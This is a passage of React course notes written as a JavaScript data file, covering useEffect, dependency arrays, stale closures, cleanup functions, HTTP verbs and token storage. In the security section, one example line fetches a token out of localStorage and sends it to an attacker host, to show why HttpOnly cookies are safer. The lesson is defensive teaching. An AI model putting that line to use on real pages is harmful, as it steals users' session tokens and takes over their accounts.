            </p>

            <ul class="notes-bullet-list">
              <li><strong>React's Primary Job (Pure Rendering):</strong>
                <ul class="notes-sub-list">
                  <li>Given a specific set of <code>props</code> and <code>state</code>, a React component should calculate and return JSX markup.</li>
                  <li>Pure rendering means: calling the component twice with the identical props and state should return the exact same JSX, without causing external ripples or modifying anything outside the component.</li>
                </ul>
              </li>
              <li><strong>What is a "Side Effect" (Effect)?</strong>
                <ul class="notes-sub-list">
                  <li>A <strong>side effect</strong> is any operation that reaches outside the component function to interact with the external world.</li>
                  <li><strong>Common Examples:</strong>
                    <br>&bull; Fetching data from a cloud REST API
                    <br>&bull; Manually mutating the physical browser DOM (e.g. <code>document.title = ...</code>)
                    <br>&bull; Setting timers (<code>setTimeout</code>, <code>setInterval</code>)
                    <br>&bull; Subscribing to browser WebSockets or geolocation sensors
                    <br>&bull; Writing data to browser <code>localStorage</code>
                  </li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 35.1 · Main Render Thread vs. Asynchronous Side-Effect Stack</span>
                <span class="diagram-frame-tag">THREAD ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Main UI render thread executing Pure JSX vs isolated useEffect queue running after paint">
                  <!-- Main UI Thread -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PRIMARY RENDER THREAD</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Pure UI Pipeline (60 FPS Goal)</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">1. Component Function Call: App()</text>
                    <text x="25" y="118" class="svg-mono-xs">2. Compute Virtual DOM &amp; Diffing</text>
                    <text x="25" y="138" class="svg-mono-xs">3. Commit DOM Mutation to Screen</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Synchronous &amp; deterministic ✓</text>
                  </g>

                  <!-- Side-Effect Stack -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">EFFECT TASK QUEUE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Asynchronous Side Stack</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• API Network Stream (Axios / Fetch)</text>
                    <text x="25" y="118" class="svg-mono-xs">• Subscriptions &amp; Window Event Handlers</text>
                    <text x="25" y="138" class="svg-mono-xs">• Document Title &amp; LocalStorage Sync</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Runs AFTER browser layout paint</text>
                  </g>

                  <!-- Connection Bridge -->
                  <path d="M 425 115 L 455 115" fill="none" stroke="var(--border)" stroke-width="2" stroke-dasharray="4 3"/>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "35.2",
          title: "The Road & Truck Analogy (Main Render Thread vs. Side Stack)",
          content: `
            <p>
              Imagine a highway with a <strong>big blue delivery truck</strong> driving down it:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Blue Truck = React's Main Render Engine:</strong>
                <ul class="notes-sub-list">
                  <li>The truck's sole mission is to haul UI elements onto the screen as fast as possible (60 to 120 times every second).</li>
                </ul>
              </li>
              <li><strong>Dumping Cargo on the Truck (The Direct Call Mistake):</strong>
                <ul class="notes-sub-list">
                  <li>If you call an API (or start a timer) directly in the body of your component, you are dumping heavy bricks directly onto the truck while it is driving!</li>
                  <li>Every single time any state changes, the component executes from top to bottom, forcing the truck to re-run your heavy network requests over and over, slowing the site to a crawl.</li>
                </ul>
              </li>
              <li><strong>The Solution — <code>useEffect</code> (The Side Lane):</strong>
                <ul class="notes-sub-list">
                  <li><code>useEffect</code> takes your side tasks off the main highway and moves them onto a <strong>side service road</strong>.</li>
                  <li>React finishes building and painting the UI on screen first (the truck arrives smoothly). Only *after* the browser screen is painted does React execute the tasks parked in your <code>useEffect</code> lane!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 35.2 · The Highway Bottleneck: Direct Execution vs. Decoupled useEffect Queue</span>
                <span class="diagram-frame-tag">EXECUTION TOPOLOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visual analogy of direct body execution blocking rendering vs useEffect side-stack isolation">
                  <!-- Anti Pattern -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">UNCONTROLLED EXECUTION</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Direct In-Body Call (Bottleneck)</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">const App = () =&gt; {</text>
                    <text x="35" y="118" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">  axios.get('/api') // ⚠ Runs every render!</text>
                    <text x="35" y="138" class="svg-mono-xs">  setData(...)     // Triggers re-render!</text>
                    <text x="25" y="158" class="svg-mono-xs">} // Result: Infinite Loop &amp; Stalled UI</text>
                  </g>

                  <!-- Production Pattern -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">USEEFFECT SHIELD</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Decoupled Side Lane Execution</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">useEffect(() =&gt; {</text>
                    <text x="35" y="118" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">  axios.get('/api').then(...) // Isolated</text>
                    <text x="25" y="138" class="svg-mono-xs">}, []) // Controlled dependency array</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Zero blocking on primary UI paint</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "35.3",
          title: "The Infinite Loop Trap of Unshielded State Setters",
          content: `
            <p>
              Here is the classic bug that every beginner writes when first trying to fetch data:
            </p>

            <pre class="notes-code-block"><code>function BrokenComponent() {
  const [data, setData] = useState([]);

  // ❌ FATAL INFINITE LOOP BUG:
  // 1. Component renders
  // 2. fetch runs directly in component body
  // 3. .then() calls setData(result)
  // 4. State updates &rarr; triggers component re-render
  // 5. Component renders &rarr; fetch runs AGAIN!
  fetch('https://api.example.com/items')
    .then(res => res.json())
    .then(result => setData(result)); // Crash! React limits re-renders!

  return &lt;div&gt;Items count: {data.length}&lt;/div&gt;;
}</code></pre>

            <p>
              <strong>The Fix:</strong> Wrap the side effect inside <code>useEffect(() =&gt; { ... }, [])</code>. The dependency array tells React to run the effect once when the component mounts, and never re-trigger it on subsequent re-renders!
            </p>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 36
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-36-dependency-array-patterns",
      number: "36",
      shortLabel: "Dependency Array & Lifecycles",
      title: "The Dependency Array & Lifecycle Execution Patterns",
      summary: "Mastering the three modes of the useEffect dependency array (no array, empty array, filled array), stale closures in effects, and cleanup functions for timers, sockets, and abort controllers.",
      subtopicLabels: ["36.1 3 Dependency Modes", "36.2 Stale Closures Trap", "36.3 Cleanup Functions"],
      diagramCount: 2,
      sections: [
        {
          num: "36.1",
          title: "The 3 Modes of the Dependency Array (Execution Triggers)",
          content: `
            <p>
              <code>useEffect</code> accepts two parameters: a <strong>callback function</strong> and an optional <strong>dependency array</strong>:
            </p>

            <pre class="notes-code-block"><code>useEffect(() => {
  // Side effect logic here
}, [dependency1, dependency2]);</code></pre>

            <ul class="notes-bullet-list">
              <li><strong>Mode 1: No Dependency Array Provided:</strong>
                <pre class="notes-code-block"><code>useEffect(() => {
  console.log('Runs on mount AND after EVERY single render!');
});</code></pre>
                <ul class="notes-sub-list">
                  <li>Executes on initial component mount and re-runs after <strong>every single state or prop change</strong>. Rarely used in production because it easily triggers performance bottlenecks.</li>
                </ul>
              </li>
              <li><strong>Mode 2: Empty Dependency Array (<code>[]</code>):</strong>
                <pre class="notes-code-block"><code>useEffect(() => {
  console.log('Runs EXACTLY ONCE on initial mount!');
}, []);</code></pre>
                <ul class="notes-sub-list">
                  <li>Tells React: <em>"This effect depends on nothing."</em> Executes exactly once when the component first mounts into the DOM (analogous to <code>componentDidMount</code> in class components). Perfect for initial API fetches and window listener registration.</li>
                </ul>
              </li>
              <li><strong>Mode 3: Array With Dependencies (<code>[count, query]</code>):</strong>
                <pre class="notes-code-block"><code>useEffect(() => {
  console.log('Runs on mount AND whenever count changes:', count);
}, [count]);</code></pre>
                <ul class="notes-sub-list">
                  <li>Executes on initial mount, and then re-runs <strong>only when one of the specified dependencies changes</strong> (via <code>Object.is</code> reference comparison).</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 36.1 · Dependency Array Execution Matrix (3 Core Modes)</span>
                <span class="diagram-frame-tag">EXECUTION MODES</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visual comparison of the three useEffect dependency array states: no array, empty array, and dependency array">
                  <!-- Mode 1: No Deps -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">MODE 01</text>
                    <text x="130" y="56" text-anchor="middle" class="svg-title">No Array [ ]</text>
                    <rect x="15" y="70" width="230" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">useEffect(() =&gt; {</text>
                    <text x="25" y="114" class="svg-mono-xs">  // Runs every render</text>
                    <text x="25" y="134" class="svg-mono-xs">})</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">Unbounded execution</text>
                  </g>

                  <!-- Mode 2: Empty Array -->
                  <g transform="translate(310, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">MODE 02</text>
                    <text x="130" y="56" text-anchor="middle" class="svg-title">Empty Array [ ]</text>
                    <rect x="15" y="70" width="230" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">useEffect(() =&gt; {</text>
                    <text x="25" y="114" class="svg-mono-xs">  // Initial mount only</text>
                    <text x="25" y="134" class="svg-mono-xs">}, [])</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Mount once ✓</text>
                  </g>

                  <!-- Mode 3: With Dependencies -->
                  <g transform="translate(595, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">MODE 03</text>
                    <text x="130" y="56" text-anchor="middle" class="svg-title">Watched [ a, b ]</text>
                    <rect x="15" y="70" width="230" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">useEffect(() =&gt; {</text>
                    <text x="25" y="114" class="svg-mono-xs">  // Mount + 'a' changed</text>
                    <text x="25" y="134" class="svg-mono-xs">}, [a])</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Surgical re-run ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "36.2",
          title: "The Stale Closure Trap in useEffect",
          content: `
            <p>
              One of the trickiest bugs in React is the <strong>Stale Closure</strong>. JavaScript functions create closures over the variables in their surrounding lexical scope at the time they are created.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Stale Timer Bug:</strong>
                <pre class="notes-code-block"><code>function StaleTimer() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      // ❌ STALE CLOSURE BUG:
      // This interval was created on mount when count was 0.
      // Because dependency array is empty [], it NEVER re-creates!
      // Every second it sets count to 0 + 1 = 1! Count is stuck at 1!
      setCount(count + 1);
    }, 1000);

    return () => clearInterval(timer);
  }, []); // Notice empty array!

  return &lt;h1&gt;Count: {count}&lt;/h1&gt;;
}</code></pre>
              </li>
              <li><strong>How to Solve Stale Closures:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Solution A (Functional Updater):</strong> Replace <code>setCount(count + 1)</code> with <code>setCount(prev =&gt; prev + 1)</code>. The functional updater does not rely on the closed-over <code>count</code> variable!</li>
                  <li><strong>Solution B (Include Dependency):</strong> Add <code>count</code> to the dependency array <code>[count]</code> so the effect re-runs and captures the latest state snapshot.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 36.2 · Lifecycle Execution &amp; Cleanup Pipeline</span>
                <span class="diagram-frame-tag">LIFECYCLE PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="End to end lifecycle timeline showing initial mount, effect execution, dependency update, cleanup function call, and unmount">
                  <!-- Step 1: Mount -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 1</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Initial Mount</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">1. Component Mount</text>
                    <text x="25" y="114" class="svg-mono-xs">2. DOM Rendered</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">3. Run Effect fn()</text>
                  </g>

                  <!-- Step 2: Delta -->
                  <g transform="translate(245, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 2</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">State Mutation</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">State 'a' changes</text>
                    <text x="25" y="114" class="svg-mono-xs">Re-render executes</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">React flags delta</text>
                  </g>

                  <!-- Step 3: Cleanup -->
                  <g transform="translate(465, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 3</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Run Cleanup</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">return () =&gt; {</text>
                    <text x="35" y="114" class="svg-mono-xs">  cleanOldData()</text>
                    <text x="25" y="134" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Step 4: Re-execution -->
                  <g transform="translate(675, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 4</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Re-Run Effect</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">Effect re-runs</text>
                    <text x="25" y="114" class="svg-mono-xs">with new state</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Memory safe ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "36.3",
          title: "Cleanup Functions & Memory Leak Prevention",
          content: `
            <p>
              When a component unmounts (e.g. user navigates to another page), any running intervals, open WebSockets, or global event listeners left behind continue running in background RAM, causing severe memory leaks.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Cleanup Function (<code>return () =&gt; { ... }</code>):</strong>
                <ul class="notes-sub-list">
                  <li>If your <code>useEffect</code> returns a function, React will automatically invoke that cleanup function in two situations:
                    <br>1. <strong>Before re-running the effect</strong> with new dependencies (cleaning up the previous run).
                    <br>2. <strong>When the component unmounts</strong> from the screen.
                  </li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState, useEffect } from 'react';

function WindowResizeTracker() {
  const [windowWidth, setWindowWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWindowWidth(window.innerWidth);

    // 1. Set up external event listener
    window.addEventListener('resize', handleResize);

    // 2. Return cleanup function to detach listener when component unmounts!
    return () => {
      console.log('Cleaning up resize listener to prevent memory leak.');
      window.removeEventListener('resize', handleResize);
    };
  }, []); // Run setup on mount, cleanup on unmount

  return &lt;div className="p-4"&gt;Current Screen Width: {windowWidth}px&lt;/div&gt;;
}

export default WindowResizeTracker;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 37
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-37-http-methods-json-cookie-storage",
      number: "37",
      shortLabel: "HTTP Methods & Auth Storage",
      title: "HTTP Methods, JSON Wire Protocol & Cookie Storage",
      summary: "Client-server communication fundamentals for frontend engineers: RESTful HTTP verbs (GET, POST, PATCH, DELETE), JSON wire serialization, and why production authentication relies on HttpOnly cookies over LocalStorage.",
      subtopicLabels: ["37.1 RESTful HTTP Verbs", "37.2 Cookies vs LocalStorage"],
      diagramCount: 2,
      sections: [
        {
          num: "37.1",
          title: "RESTful HTTP Verbs & CRUD Operations",
          content: `
            <p>
              Modern frontend client applications exchange data with cloud backend microservices using the HTTP (Hypertext Transfer Protocol) suite. When issuing requests via Axios or fetch, developers select specific HTTP verbs matching the CRUD intent of the operation:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>1. GET (Read):</strong>
                <ul class="notes-sub-list">
                  <li>Retrieves resources from the server without causing side effects. Must be <strong>Idempotent</strong> (calling it 100 times produces identical results). Has no request body (parameters are sent via URL query string).</li>
                </ul>
              </li>
              <li><strong>2. POST (Create):</strong>
                <ul class="notes-sub-list">
                  <li>Creates a new record on the server (e.g. creating a new user or order). <strong>Non-idempotent</strong> (submitting twice creates two distinct records). Payload is transmitted in the JSON request body.</li>
                </ul>
              </li>
              <li><strong>3. PATCH vs. PUT (Update):</strong>
                <ul class="notes-sub-list">
                  <li><strong>PUT:</strong> Replaces the entire target resource with the new payload.</li>
                  <li><strong>PATCH:</strong> Applies a <strong>partial update</strong> (e.g. modifying only the user's <code>email</code> without re-sending their password and address). Preferred in modern REST APIs for efficiency.</li>
                </ul>
              </li>
              <li><strong>4. DELETE (Remove):</strong>
                <ul class="notes-sub-list">
                  <li>Deletes the target resource specified by ID in the URL path (e.g. <code>DELETE /api/notes/42</code>). Idempotent.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 37.1 · Client-Server HTTP Method Architecture</span>
                <span class="diagram-frame-tag">REST TOPOLOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Visual representation of four HTTP methods GET POST PATCH DELETE mapped to their operational intents">
                  <!-- GET -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="55" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="42" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">GET</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Read Resource</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">axios.get('/photos')</text>
                    <text x="25" y="114" class="svg-mono-xs">No body attached</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Cached &amp; Idempotent</text>
                  </g>

                  <!-- POST -->
                  <g transform="translate(245, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="56" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="43" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">POST</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Create Record</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">axios.post('/auth')</text>
                    <text x="25" y="114" class="svg-mono-xs">Payload JSON body</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">Non-Idempotent</text>
                  </g>

                  <!-- PATCH -->
                  <g transform="translate(465, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="63" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="46.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PATCH</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Partial Delta</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">axios.patch('/user')</text>
                    <text x="25" y="114" class="svg-mono-xs">Sends updated fields</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Minimal bandwidth</text>
                  </g>

                  <!-- DELETE -->
                  <g transform="translate(675, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="71" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="50.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DELETE</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Remove Item</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">axios.delete('/card')</text>
                    <text x="25" y="114" class="svg-mono-xs">Resource destroyed</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">Status 204 No Content</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "37.2",
          title: "Security Architecture: Why LocalStorage is Vulnerable to XSS Token Theft",
          content: `
            <p>
              In full-stack and frontend system design interviews, a common question is: <em>"Where should you store JWT authentication tokens in the browser?"</em>
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The LocalStorage Flaw (Vulnerable to XSS):</strong>
                <ul class="notes-sub-list">
                  <li>Any JavaScript code running on your page has unrestricted read access to <code>localStorage</code>.</li>
                  <li>If your application has a single Cross-Site Scripting (XSS) vulnerability (e.g. through an unescaped comment or a compromised third-party npm package), an attacker can execute <code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))</code> and instantly hijack your user's account!</li>
                </ul>
              </li>
              <li><strong>The Production Standard: <code>HttpOnly; Secure; SameSite=Strict</code> Cookies:</strong>
                <ul class="notes-sub-list">
                  <li>When the user logs in, the backend sends the session token in a <code>Set-Cookie</code> HTTP response header with flags:
                    <br>&bull; <strong><code>HttpOnly</code>:</strong> Completely blocks JavaScript from accessing the cookie via <code>document.cookie</code>. Even if your app has an XSS bug, the attacker cannot steal the token!
                    <br>&bull; <strong><code>Secure</code>:</strong> Ensures the cookie is only transmitted over encrypted HTTPS connections.
                    <br>&bull; <strong><code>SameSite=Strict</code> (or Lax):</strong> Prevents Cross-Site Request Forgery (CSRF) by preventing external sites from sending the cookie with forged requests.
                  </li>
                  <li>The browser automatically attaches the cookie to every subsequent request to your API domain—zero manual JavaScript code required!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 37.2 · Session Security Topology: HttpOnly Cookies vs. Insecure LocalStorage</span>
                <span class="diagram-frame-tag">SECURITY TOPOLOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison diagram showing how HttpOnly cookies block malicious JavaScript access vs LocalStorage vulnerability to XSS attacks">
                  <!-- LocalStorage (Insecure) -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">LOCALSTORAGE APPROACH</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Client-Readable (XSS Vulnerable)</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• Accessible to ALL client JS: window.localStorage</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">• Vulnerable to third-party script injection (XSS)</text>
                    <text x="25" y="138" class="svg-mono-xs">• Requires manual 'Authorization: Bearer' headers</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Convenient for prototypes, unsafe for production</text>
                  </g>

                  <!-- HttpOnly Cookies (Secure) -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="204" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="117" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">HTTPONLY COOKIE APPROACH</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Browser-Enforced (Production Standard)</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">• JavaScript CANNOT read token (XSS immune) ✓</text>
